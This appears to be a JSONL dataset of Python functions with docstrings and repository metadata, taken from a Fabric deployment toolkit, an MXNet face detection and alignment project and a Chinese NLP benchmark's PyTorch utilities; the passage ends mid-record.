{"docstring": "\"\"\"\u4ecehttp://pypi.python.org\u540c\u6b65\u5305\n\n\u7528\u6cd5:\n    fab pypi.sync:django==1.3,tornado\n\"\"\"\n\n", "func_signal": "def sync(*packages):\n", "code": "config.check('PYPI_HOST',\n             'PYPI_USER',\n             'PYPI_ROOT')\n\nwith settings(host_string=env.PYPI_HOST, user=env.PYPI_USER):\n    cmd = [\"pip\", \"-q\", \"install\", \"--no-deps\", \"-i\", \"https://pypi.python.org/simple\",\n           \"-d\", env.PYPI_ROOT,\n           ' '.join(packages)]\n\n    run(\" \".join(cmd))", "path": "essay\\tasks\\pypi.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n    \u62f7\u8d1d\u5de5\u7a0b\u6253\u5305\u53cafab\u6587\u4ef6\u5230\u5de5\u7a0b\n\"\"\"\n", "func_signal": "def build_structure(project, dst, params, template='default'):\n", "code": "dst = dst.rstrip('/')\n\ntemplate_dir = path.join(settings.PROJECT_ROOT, 'templates', template)\nfor root, dirs, files in os.walk(template_dir):\n    for name in files:\n        if name.endswith('.tpl'):\n            src = path.join(root, name)\n            dst_filename = src.replace(template_dir, dst).rstrip('.tpl').replace('__project__', project)\n            dst_dir = os.path.dirname(dst_filename)\n\n            fs.ensure_dir(dst_dir, in_local=True)\n\n            content = open(src).read().decode('utf-8')\n            if not name.endswith('.conf.tpl'):\n                content = string.Template(content).safe_substitute(**params)\n\n            open(dst_filename, 'w').write(content.encode('utf-8'))", "path": "essay\\project.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n\u505c\u6b62\u6307\u5b9a\u7279\u5f81\u7684\u8fdb\u7a0b\n\"\"\"\n\n", "func_signal": "def kill_by_name(name):\n", "code": "with settings(warn_only=True):\n    run(\"ps aux | grep '%s' | grep -v 'grep' | awk '{print $2}' | xargs kill -9\" % name)", "path": "essay\\tasks\\process.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n\u9a8c\u8bc1\u90e8\u7f72\u662f\u5426\u6210\u529f\n\n\u53c2\u6570:\n    venv: \u865a\u62df\u73af\u5883\u540d\u79f0\n    role: \u670d\u52a1\u5668\u89d2\u8272\n\n\u7528\u6cd5:\n    $ fab validate:a,product,[custom_args]\n\n\"\"\"\n", "func_signal": "def validate(venv, role='product', *args, **kwargs):\n", "code": "validator_path = env.VALIDATOR_CLASS\nvalidator_class = import_by_path(validator_path)\n\ntry:\n    validator_instance = validator_class(venv, role, *args, **kwargs)\nexcept TypeError:\n    raise Exception(\"{}\u4e0d\u662f\u4e00\u4e2a\u6709\u6548\u7684Validator\".format(validator_path))\n\nvalidator_instance.run()", "path": "essay\\tasks\\validate.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n    \u628a\u9879\u76eelone\u5230\u672c\u5730\n\"\"\"\n", "func_signal": "def reset(in_local=False, git_path=None):\n", "code": "cmd = 'git reset --hard'\ncommand(cmd, in_local, git_path)", "path": "essay\\tasks\\git.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\u521b\u5efa\u672c\u5730\u5de5\u7a0b\"\"\"\n", "func_signal": "def create_project(project, template='default'):\n", "code": "init_project(project, template)\nwith lcd(project):\n    git.command('git init', in_local=True)\n    git.add(add_all=True, in_local=True)\n    git.commit(u'\u521d\u59cb\u5316\u5de5\u7a0b\u7ed3\u6784', in_local=True)\n    repos = prompt('\u8bf7\u8f93\u5165Git\u4ed3\u5e93\u5730\u5740:')\n    if repos:\n        git.command('git remote add origin %s' % repos, in_local=True)\n        git.command('git push -u origin master', in_local=True)", "path": "essay\\project.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\"\n\u67e5\u770b\u6307\u5b9a\u865a\u62df\u73af\u5883\u7684\u8fdb\u7a0bCPU\u5360\u7528\n\"\"\"\n\n", "func_signal": "def ps_by_venv(venv_dir):\n", "code": "with hide('status', 'running', 'stderr'):\n    run(\"\"\"ps aux | grep -v grep | grep -v supervisor | grep %s | awk '{print $3, \"|\", $4}'\"\"\" % venv_dir)", "path": "essay\\tasks\\process.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\u786e\u4fdd\u6307\u5b9a\u7684dir\u88ab\u521b\u5efa\"\"\"\n\n", "func_signal": "def ensure_dir(dir, in_local=False):\n", "code": "if in_local:\n    if not path.isdir(dir):\n        local(\"mkdir -p \" + dir)\nelif not files.exists(dir):\n    run(\"mkdir -p \" + dir)", "path": "essay\\tasks\\fs.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n    \u628a\u9879\u76eelone\u5230\u672c\u5730\n\"\"\"\n", "func_signal": "def pull(in_local=False, git_path=None):\n", "code": "cmd = 'git pull'\n\ncommand(cmd, in_local, git_path)", "path": "essay\\tasks\\git.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\nLoad the image from disk in RGB format.\n\n:return: RGB image. Shape: (height, width, 3)\n:rtype: numpy.ndarray\n\"\"\"\n", "func_signal": "def getRGB(self):\n", "code": "bgr = self.getBGR()\nif bgr is not None:\n    rgb = cv2.cvtColor(bgr, cv2.COLOR_BGR2RGB)\nelse:\n    rgb = None\nreturn rgb", "path": "util\\align_face.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "# for each (H, W) location i\n#   generate A anchor boxes centered on cell i\n#   apply predicted bbox deltas at cell i to each of the A anchors\n# clip predicted boxes to image\n# remove predicted boxes with either height or width < threshold\n# sort all (proposal, score) pairs by score from highest to lowest\n# take top pre_nms_topN proposals before NMS\n# apply NMS with threshold 0.7 to remaining proposals\n# take after_nms_topN proposals after NMS\n# return the top proposals (-> RoIs top, scores top)\n", "func_signal": "def forward(self, is_train, req, in_data, out_data, aux):\n", "code": "pre_nms_topN = config[self.cfg_key].RPN_PRE_NMS_TOP_N\npost_nms_topN = config[self.cfg_key].RPN_POST_NMS_TOP_N\nnms_thresh = config[self.cfg_key].RPN_NMS_THRESH\nmin_size = config[self.cfg_key].RPN_MIN_SIZE\n\n# the first set of anchors are background probabilities\n# keep the second part\nscores = in_data[0].asnumpy()[:, self._num_anchors:, :, :]\nif np.isnan(scores).any():\n    raise ValueError(\"there is nan in input scores\")\nbbox_deltas = in_data[1].asnumpy()\nif np.isnan(bbox_deltas).any():\n    raise ValueError(\"there is nan in input bbox_deltas\")\nim_info = in_data[2].asnumpy()[0, :]\n\n# 1. Generate proposals from bbox_deltas and shifted anchors\nheight, width = scores.shape[-2:]\nif self.cfg_key == 'TRAIN':\n    height, width = int(im_info[0] / self._feat_stride), int(im_info[1] / self._feat_stride)\n\n# Enumerate all shifts\nshift_x = np.arange(0, width) * self._feat_stride\nshift_y = np.arange(0, height) * self._feat_stride\nshift_x, shift_y = np.meshgrid(shift_x, shift_y)\nshifts = np.vstack((shift_x.ravel(), shift_y.ravel(), shift_x.ravel(), shift_y.ravel())).transpose()\n\n# Enumerate all shifted anchors:\n#\n# add A anchors (1, A, 4) to\n# cell K shifts (K, 1, 4) to get\n# shift anchors (K, A, 4)\n# reshape to (K*A, 4) shifted anchors\nA = self._num_anchors\nK = shifts.shape[0]\nanchors = self._anchors.reshape((1, A, 4)) + shifts.reshape((1, K, 4)).transpose((1, 0, 2))\nanchors = anchors.reshape((K * A, 4))\n# Transpose and reshape predicted bbox transformations to get them\n# into the same order as the anchors:\n#\n# bbox deltas will be (1, 4 * A, H, W) format\n# transpose to (1, H, W, 4 * A)\n# reshape to (1 * H * W * A, 4) where rows are ordered by (h, w, a)\n# in slowest to fastest order\nbbox_deltas = clip_pad(bbox_deltas, (height, width))\nbbox_deltas = bbox_deltas.transpose((0, 2, 3, 1)).reshape((-1, 4))\n\n# Same story for the scores:\n#\n# scores are (1, A, H, W) format\n# transpose to (1, H, W, A)\n# reshape to (1 * H * W * A, 1) where rows are ordered by (h, w, a)\nscores = scores.transpose((0, 2, 3, 1)).reshape((-1, 1))\n\n# Convert anchors into proposals via bbox transformations\nproposals = bbox_pred(anchors, bbox_deltas)\n\n# 2. clip predicted boxes to image\nproposals = clip_boxes(proposals, im_info[:2])\n\n# 3. remove predicted boxes with either height or width < threshold\n# (NOTE: convert min_size to input image scale stored in im_info[2])\nkeep = ProposalOperator._filter_boxes(proposals, min_size * im_info[2])\n\nproposals = proposals[keep, :]\nscores = scores[keep]\n# 4. sort all (proposal, score) pairs by score from highest to lowest\n# 5. take top pre_nms_topN (e.g. 6000)\norder = scores.ravel().argsort()[::-1]\nif pre_nms_topN > 0:\n    order = order[:pre_nms_topN]\nproposals = proposals[order, :]\nscores = scores[order]\n# 6. apply nms (e.g. threshold = 0.7)\n# 7. take after_nms_topN (e.g. 300)\n# 8. return the top proposals (-> RoIs top)\nkeep = nms(np.hstack((proposals, scores)), nms_thresh)\nif post_nms_topN > 0:\n    keep = keep[:post_nms_topN]\n# pad to ensure output size remains unchanged\nif len(keep) < post_nms_topN:\n    pad = npr.choice(keep, size=post_nms_topN - len(keep))\n    keep = np.hstack((keep, pad))\nproposals = proposals[keep, :]\nscores = scores[keep]\n# Output rois array\n# Our RPN implementation only supports a single input image, so all\n# batch inds are 0\nbatch_inds = np.zeros((proposals.shape[0], 1), dtype=np.float32)\nblob = np.hstack((batch_inds, proposals.astype(np.float32, copy=False)))\nself.assign(out_data[0], req[0], blob)\nif self._output_score:\n    self.assign(out_data[1], req[1], scores.astype(np.float32, copy=False))", "path": "detection\\symbol\\proposal.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nClip boxes of the pad area.\n:param boxes: [n, c, H, W]\n:param im_shape: [h, w]\n:return: [n, c, h, w]\n\"\"\"\n", "func_signal": "def clip_pad(boxes, pad_shape):\n", "code": "H, W = boxes.shape[2:]\nh, w = pad_shape\nif h < H:\n    boxes = boxes[:, :, :h, :].copy()\nif w < W:\n    boxes = boxes[:, :, :, :w].copy()\nreturn boxes", "path": "detection\\symbol\\processing.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nClip boxes to image boundaries.\n:param boxes: [N, 4* num_classes]\n:param im_shape: tuple of 2\n:return: [N, 4* num_classes]\n\"\"\"\n# x1 >= 0\n", "func_signal": "def clip_boxes(boxes, im_shape):\n", "code": "boxes[:, 0::4] = np.maximum(np.minimum(boxes[:, 0::4], im_shape[1] - 1), 0)\n# y1 >= 0\nboxes[:, 1::4] = np.maximum(np.minimum(boxes[:, 1::4], im_shape[0] - 1), 0)\n# x2 < im_shape[1]\nboxes[:, 2::4] = np.maximum(np.minimum(boxes[:, 2::4], im_shape[1] - 1), 0)\n# y2 < im_shape[0]\nboxes[:, 3::4] = np.maximum(np.minimum(boxes[:, 3::4], im_shape[0] - 1), 0)\nreturn boxes", "path": "detection\\symbol\\processing.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\ncompute bounding box regression targets from ex_rois to gt_rois\n:param ex_rois: [N, 4]\n:param gt_rois: [N, 4]\n:return: [N, 4]\n\"\"\"\n", "func_signal": "def bbox_transform(ex_rois, gt_rois):\n", "code": "ex_widths = ex_rois[:, 2] - ex_rois[:, 0] + 1.0\nex_heights = ex_rois[:, 3] - ex_rois[:, 1] + 1.0\nex_ctr_x = ex_rois[:, 0] + 0.5 * (ex_widths - 1.0)\nex_ctr_y = ex_rois[:, 1] + 0.5 * (ex_heights - 1.0)\n\ngt_widths = gt_rois[:, 2] - gt_rois[:, 0] + 1.0\ngt_heights = gt_rois[:, 3] - gt_rois[:, 1] + 1.0\ngt_ctr_x = gt_rois[:, 0] + 0.5 * (gt_widths - 1.0)\ngt_ctr_y = gt_rois[:, 1] + 0.5 * (gt_heights - 1.0)\n\ntargets_dx = (gt_ctr_x - ex_ctr_x) / (ex_widths + 1e-14)\ntargets_dy = (gt_ctr_y - ex_ctr_y) / (ex_heights + 1e-14)\ntargets_dw = np.log(gt_widths / ex_widths)\ntargets_dh = np.log(gt_heights / ex_heights)\n\ntargets = np.vstack(\n    (targets_dx, targets_dy, targets_dw, targets_dh)).transpose()\nreturn targets", "path": "detection\\symbol\\processing.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nLoad the image from disk in BGR format.\n\n:return: BGR image. Shape: (height, width, 3)\n:rtype: numpy.ndarray\n\"\"\"\n", "func_signal": "def getBGR(self):\n", "code": "try:\n    bgr = cv2.imread(self.path)\nexcept:\n    bgr = None\nreturn bgr", "path": "util\\align_face.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nFind the landmarks of a face.\n\n:param rgbImg: RGB image to process. Shape: (height, width, 3)\n:type rgbImg: numpy.ndarray\n:param bb: Bounding box around the face to find landmarks for.\n:type bb: dlib.rectangle\n:return: Detected landmark locations.\n:rtype: list of (x,y) tuples\n\"\"\"\n", "func_signal": "def findLandmarks(self, rgbImg, bb):\n", "code": "assert rgbImg is not None\nassert bb is not None\n\npoints = self.predictor(rgbImg, bb)\nreturn list(map(lambda p: (p.x, p.y), points.parts()))", "path": "util\\align_face.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nFind all face bounding boxes in an image.\n\n:param rgbImg: RGB image to process. Shape: (height, width, 3)\n:type rgbImg: numpy.ndarray\n:return: All face bounding boxes in an image.\n:rtype: dlib.rectangles\n\"\"\"\n", "func_signal": "def getAllFaceBoundingBoxes(self, rgbImg):\n", "code": "assert rgbImg is not None\n\ntry:\n    return self.detector(rgbImg, 1)\nexcept Exception as e:\n    print(\"Warning: {}\".format(e))\n    # In rare cases, exceptions are thrown.\n    return []", "path": "util\\align_face.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nTransform the set of class-agnostic boxes into class-specific boxes\nby applying the predicted offsets (box_deltas)\n:param boxes: !important [N 4]\n:param box_deltas: [N, 4 * num_classes]\n:return: [N 4 * num_classes]\n\"\"\"\n", "func_signal": "def bbox_pred(boxes, box_deltas, is_train=False):\n", "code": "if boxes.shape[0] == 0:\n    return np.zeros((0, box_deltas.shape[1]))\n\nboxes = boxes.astype(np.float, copy=False)\nwidths = boxes[:, 2] - boxes[:, 0] + 1.0\nheights = boxes[:, 3] - boxes[:, 1] + 1.0\nctr_x = boxes[:, 0] + 0.5 * (widths - 1.0)\nctr_y = boxes[:, 1] + 0.5 * (heights - 1.0)\n\ndx = box_deltas[:, 0::4]\ndy = box_deltas[:, 1::4]\ndw = box_deltas[:, 2::4]\ndh = box_deltas[:, 3::4]\nif is_train:\n    dx = np.array(map(lambda x: np.sign(x)*10 if abs(x) > 10 else x, dx))\n    dy = np.array(map(lambda x: np.sign(x)*10 if abs(x) > 10 else x, dy))\npred_ctr_x = dx * widths[:, np.newaxis] + ctr_x[:, np.newaxis]\npred_ctr_y = dy * heights[:, np.newaxis] + ctr_y[:, np.newaxis]\n\nif is_train:\n    dw = np.array(map(lambda x: np.sign(x)*8 if abs(x) > 8 else x, dw))\n    dh = np.array(map(lambda x: np.sign(x)*8 if abs(x) > 8 else x, dh))\npred_w = np.exp(dw) * widths[:, np.newaxis]\npred_h = np.exp(dh) * heights[:, np.newaxis]\n\npred_boxes = np.zeros(box_deltas.shape)\n# x1\npred_boxes[:, 0::4] = pred_ctr_x - 0.5 * (pred_w - 1.0)\n# y1\npred_boxes[:, 1::4] = pred_ctr_y - 0.5 * (pred_h - 1.0)\n# x2\npred_boxes[:, 2::4] = pred_ctr_x + 0.5 * (pred_w - 1.0)\n# y2\npred_boxes[:, 3::4] = pred_ctr_y + 0.5 * (pred_h - 1.0)\n\nreturn pred_boxes", "path": "detection\\symbol\\processing.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nGiven a vector of widths (ws) and heights (hs) around a center\n(x_ctr, y_ctr), output a set of anchors (windows).\n\"\"\"\n\n", "func_signal": "def _mkanchors(ws, hs, x_ctr, y_ctr):\n", "code": "ws = ws[:, np.newaxis]\nhs = hs[:, np.newaxis]\nanchors = np.hstack((x_ctr - 0.5 * (ws - 1),\n                     y_ctr - 0.5 * (hs - 1),\n                     x_ctr + 0.5 * (ws - 1),\n                     y_ctr + 0.5 * (hs - 1)))\nreturn anchors", "path": "detection\\symbol\\processing.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "# symbol = lightened_moon(num_classes=40, use_fuse=False)\n", "func_signal": "def main():\n", "code": "symbol = lightened_moon(num_classes=40, use_fuse=True)\ndevs = mx.cpu() if args.gpus is None else [mx.gpu(int(i)) for i in args.gpus.split(',')]\nepoch_size = args.num_examples / args.batch_size\ncheckpoint = mx.callback.do_checkpoint(args.model_save_prefix)\nkv = mx.kvstore.create(args.kv_store)\narg_params = None\naux_params = None\nif args.retrain:\n    _, arg_params, aux_params = mx.model.load_checkpoint(args.model_load_prefix, args.model_load_epoch)\ntrain = mx.io.ImageRecordIter(\n    path_imglist = args.list_dir + 'celeba_train.lst',\n    path_imgrec = args.data_dir + \"celeba_train.rec\",\n    label_width = 40,\n    data_name   = 'data',\n    label_name  = 'Moon_label',\n    data_shape  = (1, 128, 128),\n    scale       = 1./255,\n    batch_size  = args.batch_size,\n    rand_crop   = True,\n    rand_mirror = True,\n    num_parts   = kv.num_workers,\n    part_index  = kv.rank)\nval = mx.io.ImageRecordIter(\n    path_imglist = args.list_dir + 'celeba_val.lst',\n    path_imgrec = args.data_dir + \"celeba_val.rec\",\n    label_width = 40,\n    data_name   = 'data',\n    label_name  = 'Moon_label',\n    batch_size  = args.batch_size,\n    data_shape  = (1, 128, 128),\n    scale       = 1./255,\n    rand_crop   = True,\n    rand_mirror = False,\n    num_parts   = kv.num_workers,\n    part_index  = kv.rank)\nmodel = mx.model.FeedForward(\n    ctx                = devs,\n    symbol             = symbol,\n    arg_params         = arg_params,\n    aux_params         = aux_params,\n    num_epoch          = 100,\n    begin_epoch        = args.model_load_epoch,\n    learning_rate      = args.lr,\n    momentum           = 0.9,\n    wd                 = 0.0005,\n    lr_scheduler       = mx.lr_scheduler.FactorScheduler(step=4*max(int(epoch_size * 1), 1), factor=0.8, stop_factor_lr=1e-5),\n    initializer        = mx.init.Xavier(factor_type=\"in\", magnitude=2.34))\nmodel.fit(\n    X                  = train,\n    eval_data          = val,\n    eval_metric        = ['multi_binary_acc'],\n    kvstore            = kv,\n    batch_end_callback = mx.callback.Speedometer(args.batch_size, 10),\n    epoch_end_callback = checkpoint)\n    # monitor            = mon)", "path": "attribute\\lightened_moon.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nCreate a directory and don't error if the path already exists.\n\nIf the directory already exists, don't do anything.\n\n:param path: The directory to create.\n:type path: str\n\"\"\"\n", "func_signal": "def mkdirP(path):\n", "code": "assert path is not None\n\ntry:\n    os.makedirs(path)\nexcept OSError as exc:  # Python >2.5\n    if exc.errno == errno.EEXIST and os.path.isdir(path):\n        pass\n    else:\n        raise", "path": "util\\align_face.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nEnumerate a set of anchors for each aspect ratio wrt an anchor.\n\"\"\"\n\n", "func_signal": "def _ratio_enum(anchor, ratios):\n", "code": "w, h, x_ctr, y_ctr = _whctrs(anchor)\nsize = w * h\nsize_ratios = size / ratios\nws = np.round(np.sqrt(size_ratios))\nhs = np.round(ws * ratios)\nanchors = _mkanchors(ws, hs, x_ctr, y_ctr)\nreturn anchors", "path": "detection\\symbol\\processing.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nFind the largest face bounding box in an image.\n\n:param rgbImg: RGB image to process. Shape: (height, width, 3)\n:type rgbImg: numpy.ndarray\n:return: The largest face bounding box in an image, or None.\n:rtype: dlib.rectangle\n\"\"\"\n", "func_signal": "def getLargestFaceBoundingBox(self, rgbImg):\n", "code": "assert rgbImg is not None\n\nfaces = self.getAllFaceBoundingBoxes(rgbImg)\nif len(faces) > 0:\n    return max(faces, key=lambda rect: rect.width() * rect.height())\nelse:\n    return None", "path": "util\\align_face.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nReturn width, height, x center, and y center for an anchor (window).\n\"\"\"\n\n", "func_signal": "def _whctrs(anchor):\n", "code": "w = anchor[2] - anchor[0] + 1\nh = anchor[3] - anchor[1] + 1\nx_ctr = anchor[0] + 0.5 * (w - 1)\ny_ctr = anchor[1] + 0.5 * (h - 1)\nreturn w, h, x_ctr, y_ctr", "path": "detection\\symbol\\processing.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nonly resize input image to target size and return scale\n:param im: BGR image input by opencv\n:param target_size: one dimensional size (the short side)\n:param max_size: one dimensional max size (the long side)\n:return:\n\"\"\"\n", "func_signal": "def resize(im, target_size, max_size):\n", "code": "im_shape = im.shape\nim_size_min = np.min(im_shape[0:2])\nim_size_max = np.max(im_shape[0:2])\nim_scale = float(target_size) / float(im_size_min)\nif np.round(im_scale * im_size_max) > max_size:\n    im_scale = float(max_size) / float(im_size_max)\nim = cv2.resize(im, None, None, fx=im_scale, fy=im_scale, interpolation=cv2.INTER_LINEAR)\nreturn im, im_scale", "path": "detection\\detection.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nInstantiate an 'AlignDlib' object.\n\n:param facePredictor: The path to dlib's\n:type facePredictor: str\n\"\"\"\n", "func_signal": "def __init__(self, facePredictor):\n", "code": "assert facePredictor is not None\n\nself.detector = dlib.get_frontal_face_detector()\nself.predictor = dlib.shape_predictor(facePredictor)", "path": "util\\align_face.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\nfilter the box when it's the inner of other box\n:param dets: [[x1, y1, x2, y2 score]]\n:param thresh: retain overlap < thresh\n:return: indexes to keep\n\"\"\"\n", "func_signal": "def nest(dets, thresh=0.90):\n", "code": "x1 = dets[:, 0]\ny1 = dets[:, 1]\nx2 = dets[:, 2]\ny2 = dets[:, 3]\nareas = (x2 - x1 + 1) * (y2 - y1 + 1)\n# import pdb;pdb.set_trace()\n\nkeep = []\nfor i in range(len(dets)):\n    flag_keep = True\n    for j in range(len(dets)):\n        if j == i: continue\n        xx1 = max(x1[i], x1[j])\n        yy1 = max(y1[i], y1[j])\n        xx2 = min(x2[i], x2[j])\n        yy2 = min(y2[i], y2[j])\n        w = max(0, xx2 - xx1 + 1)\n        h = max(0, yy2 - yy1 + 1)\n        inter = w * h\n        if inter / areas[i] > thresh:\n            flag_keep = False\n    if flag_keep:\n        keep.append(i)\nreturn keep", "path": "detection\\symbol\\processing.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "# lightened_cnn = lightened_cnn_a()\n", "func_signal": "def main():\n", "code": "lightened_cnn = lightened_cnn_b()\ndevs = mx.cpu() if args.gpus is None else [mx.gpu(int(i)) for i in args.gpus.split(',')]\nepoch_size = args.num_examples / args.batch_size\ncheckpoint = mx.callback.do_checkpoint(args.model_save_prefix)\nkv = mx.kvstore.create(args.kv_store)\narg_params = None\naux_params = None\nif args.retrain:\n    _, arg_params, aux_params = mx.model.load_checkpoint(args.model_load_prefix, args.model_load_epoch)\n\ntrain = mx.io.ImageRecordIter(\n    path_imgrec = args.data_dir + \"casia_train.rec\",\n    data_shape  = (1, 128, 128),\n    scale       = 1./255,\n    batch_size  = args.batch_size,\n    rand_crop   = True,\n    rand_mirror = True,\n    num_parts   = kv.num_workers,\n    part_index  = kv.rank)\nif not args.retrain:\n    val = mx.io.ImageRecordIter(\n        path_imgrec = args.data_dir + \"casia_val.rec\",\n        batch_size  = args.batch_size,\n        data_shape  = (1, 128, 128),\n        scale       = 1./255,\n        rand_crop   = True,\n        rand_mirror = False,\n        num_parts   = kv.num_workers,\n        part_index  = kv.rank)\nelse:\n    val = None\nmodel = mx.model.FeedForward(\n    ctx                = devs,\n    symbol             = lightened_cnn,\n    arg_params         = arg_params,\n    aux_params         = aux_params,\n    num_epoch          = 200,\n    learning_rate      = args.lr,\n    momentum           = 0.9,\n    wd                 = 0.0005,\n    lr_scheduler       = mx.lr_scheduler.FactorScheduler(step=5*max(int(epoch_size * 1), 1), factor=0.8, stop_factor_lr=5e-5),\n    initializer        = mx.init.Xavier(factor_type=\"in\", magnitude=2.34))\nmodel.fit(\n    X                  = train,\n    eval_data          = val,\n    kvstore            = kv,\n    batch_end_callback = mx.callback.Speedometer(args.batch_size, 100),\n    epoch_end_callback = checkpoint)", "path": "verification\\lightened_cnn.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "\"\"\"\ngreedily select boxes with high confidence and overlap with current maximum <= thresh\nrule out overlap >= thresh\n:param dets: [[x1, y1, x2, y2 score]]\n:param thresh: retain overlap < thresh\n:return: indexes to keep\n\"\"\"\n", "func_signal": "def nms(dets, thresh):\n", "code": "x1 = dets[:, 0]\ny1 = dets[:, 1]\nx2 = dets[:, 2]\ny2 = dets[:, 3]\nscores = dets[:, 4]\n\nareas = (x2 - x1 + 1) * (y2 - y1 + 1)\norder = scores.argsort()[::-1]\n\nkeep = []\nwhile order.size > 0:\n    i = order[0]\n    keep.append(i)\n    xx1 = np.maximum(x1[i], x1[order[1:]])\n    yy1 = np.maximum(y1[i], y1[order[1:]])\n    xx2 = np.minimum(x2[i], x2[order[1:]])\n    yy2 = np.minimum(y2[i], y2[order[1:]])\n\n    w = np.maximum(0.0, xx2 - xx1 + 1)\n    h = np.maximum(0.0, yy2 - yy1 + 1)\n    inter = w * h\n    ovr = inter / (areas[i] + areas[order[1:]] - inter)\n\n    inds = np.where(ovr <= thresh)[0]\n    order = order[inds + 1]\n\nreturn keep", "path": "detection\\symbol\\processing.py", "repo_name": "tornadomeet/mxnet-face", "stars": 543, "license": "apache-2.0", "language": "python", "size": 35740}
{"docstring": "'''\n\u52a0\u8f7d.npy\u6587\u4ef6\n:param file_path:\n:return:\n'''\n", "func_signal": "def load_numpy(file_path):\n", "code": "if not isinstance(file_path, Path):\n    file_path = Path(file_path)\nnp.load(str(file_path))", "path": "baselines\\models_pytorch\\classifier_pytorch\\tools\\common.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "'''\n\u5224\u65ad\u73af\u5883 cpu\u8fd8\u662fgpu\n\u652f\u6301\u5355\u673a\u591a\u5361\n:param n_gpu:\n:param model:\n:return:\n'''\n", "func_signal": "def model_device(n_gpu, model):\n", "code": "device, device_ids = prepare_device(n_gpu)\nif len(device_ids) > 1:\n    logger.info(f\"current {len(device_ids)} GPUs\")\n    model = torch.nn.DataParallel(model, device_ids=device_ids)\nif len(device_ids) == 1:\n    os.environ['CUDA_VISIBLE_DEVICES'] = str(device_ids[0])\nmodel = model.to(device)\nreturn model, device", "path": "baselines\\models_pytorch\\classifier_pytorch\\tools\\common.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "\"\"\" Load tf checkpoints in a pytorch model.\n\"\"\"\n", "func_signal": "def load_tf_weights_in_bert(model, config, tf_checkpoint_path):\n", "code": "try:\n    import re\n    import numpy as np\n    import tensorflow as tf\nexcept ImportError:\n    logger.error(\"Loading a TensorFlow model in PyTorch, requires TensorFlow to be installed. Please see \"\n        \"https://www.tensorflow.org/install/ for installation instructions.\")\n    raise\ntf_path = os.path.abspath(tf_checkpoint_path)\nlogger.info(\"Converting TensorFlow checkpoint from {}\".format(tf_path))\n# Load weights from TF model\ninit_vars = tf.train.list_variables(tf_path)\nnames = []\narrays = []\nfor name, shape in init_vars:\n    logger.info(\"Loading TF weight {} with shape {}\".format(name, shape))\n    array = tf.train.load_variable(tf_path, name)\n    names.append(name)\n    arrays.append(array)\n\nfor name, array in zip(names, arrays):\n    name = name.split('/')\n    # adam_v and adam_m are variables used in AdamWeightDecayOptimizer to calculated m and v\n    # which are not required for using pretrained model\n    if any(n in [\"adam_v\", \"adam_m\", \"global_step\"] for n in name):\n        logger.info(\"Skipping {}\".format(\"/\".join(name)))\n        continue\n    pointer = model\n    for m_name in name:\n        if re.fullmatch(r'[A-Za-z]+_\\d+', m_name):\n            l = re.split(r'_(\\d+)', m_name)\n        else:\n            l = [m_name]\n        if l[0] == 'kernel' or l[0] == 'gamma':\n            pointer = getattr(pointer, 'weight')\n        elif l[0] == 'output_bias' or 